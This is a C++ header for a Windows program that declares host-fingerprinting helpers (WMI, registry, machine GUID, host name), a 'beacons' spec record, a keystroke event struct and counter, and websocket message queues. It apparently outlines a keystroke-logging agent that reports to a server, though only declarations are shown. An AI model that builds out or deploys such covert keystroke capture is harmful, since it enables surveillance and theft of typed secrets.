#pragma once 
#include <boost/asio.hpp>
#include <boost/beast.hpp> 
#include <boost/json.hpp> 
#include <semaphore>
#include <atomic> 
#include <mutex> 
#include <iostream> 
#include <string> 
#include <thread>
#include <chrono> 
#include <unordered_map>
#include <sstream>
#include <iomanip> 
#include <wbemidl.h>
#include <comdef.h>
#include <wrl/client.h>
#include <stdexcept>
#include <vector>
#include <memory>
#include <deque>
#include <stop_token>
#include <queue>
#include <algorithm>
#include <format>
#include <cstdint>
#include <Windows.h>
#include <fstream>
#include <filesystem>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "Rpcrt4.lib")
namespace json = boost::json; 
namespace asio = boost::asio;
namespace beast = boost::beast;
namespace websocket = beast::websocket;
using namespace std::chrono_literals;
using tcp = asio::ip::tcp;

constexpr int MAX_COUNT = 1024;
 
std::string NewUuid();
std::string LoadOrCreateInstallId();
// -------------------- UTF16 <-> UTF8 --------------------
std::string WideToUtf8(const std::wstring& w);
std::wstring Trim(const std::wstring& s);
std::wstring Join(const std::vector<std::wstring>& v, const wchar_t* sep);

// --------------------Registry helpers--------------------
std::wstring RegGetSz(HKEY root, const wchar_t* subKey, const wchar_t* valueName);
bool RegGetDword(HKEY root, const wchar_t* subKey, const wchar_t* valueName, DWORD& out);

// -------------------- WMI wrapper --------------------
class Wmi {
private:
    static std::string HrHex(HRESULT hr);
    // 프로세스에서 1번만
    static void InitSecurityOnce();

    // 스레드마다 init/uninit
    struct ComApartment {
        bool active = false; // 내가 CoInitializeEx 성공했으면 true
        ComApartment() {
            HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
            if (hr == S_OK || hr == S_FALSE) {
                active = true;
            }
            else if (hr == RPC_E_CHANGED_MODE) {
                // 이미 다른 모드(STA 등)로 init된 스레드. 그래도 COM은 이미 켜져있음.
                active = false;
            }
            else {
                throw std::runtime_error("CoInitializeEx failed: " + HrHex(hr));
            }
        }
        ~ComApartment() noexcept {
            if (active) CoUninitialize();
        }
    };

    // 중요: 선언 순서
    // 파괴는 역순이므로 services_가 먼저 Release되고 com_이 마지막에 CoUninitialize 함
    ComApartment com_;
    Microsoft::WRL::ComPtr<IWbemServices> services_;
public:
    Wmi();
    // 소멸자 따로 만들 필요 없음. 기본 소멸자면 끝.
    // ~Wmi() = default;

    std::vector<std::wstring> QueryStringList(const std::wstring& className, const std::wstring& propName);

};

// -------------------- GetMachineGuid -------------------- 

// -------------------- GetHostNameW --------------------
std::wstring GetHostNameW(bool fqdn);
std::string GetHostNameUtf8(bool fqdn);

// -------------------- Output struct --------------------
struct Spec {
    std::string cpu_name;     // beacons.cpu_name
    std::string gpu_name;     // beacons.gpu_name (없으면 empty)
    std::string ram;          // beacons.ram (ex: "16.00 GB")
    std::string os_name;      // beacons.os_name (ex: "Windows 11 Pro")
    std::string os_version;   // beacons.os_version (ex: "23H2 (10.0.22631.2861)")
    std::string machine_guid; // beacons.machine_guid (ex: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx")
    std::string host_name;    // beacons.host_name (필요시)
};

// -------------------- Collectors --------------------
std::string FormatRamGbString(double gb);

bool TryGetInstalledRamGb(double& outGb);

void GetWindowsOsNameVersion(std::string& outName, std::string& outVersion);

Spec getSpec();

// ======================== key_converter ========================


std::string GetCurrentTimestamp();
std::string FormatTime(const SYSTEMTIME& st);

// ======================== key event structure ========================
struct KeyEvent{
    std::string timeStamp;
    std::string capsLock;
    std::string eventType;
    std::string keyString;
    KeyEvent(const std::string &timeStamp, const std::string& _capsLock, const std::string& _eventType, const std::string& _keyString);
}; 
// ======================== logger ========================



//======================== received message ========================
extern std::mutex recv_m;
extern std::queue<std::string> recv_q;
extern std::counting_semaphore<MAX_COUNT> recv_sem; 

// ======================== metric ========================
extern std::atomic<uint64_t> g_keystrokes;
extern std::mutex metric_m;
extern std::counting_semaphore<MAX_COUNT> metric_sem;
extern std::queue<json::object> metric_q;
extern std::atomic<bool> metric_running;
extern std::atomic<int> g_window_ms; // default safe
struct ClockMapper {
    std::chrono::steady_clock::time_point steady_base;
    std::chrono::system_clock::time_point sys_base;

    ClockMapper();

    int64_t to_epoch_ms(std::chrono::steady_clock::time_point tp) const;
};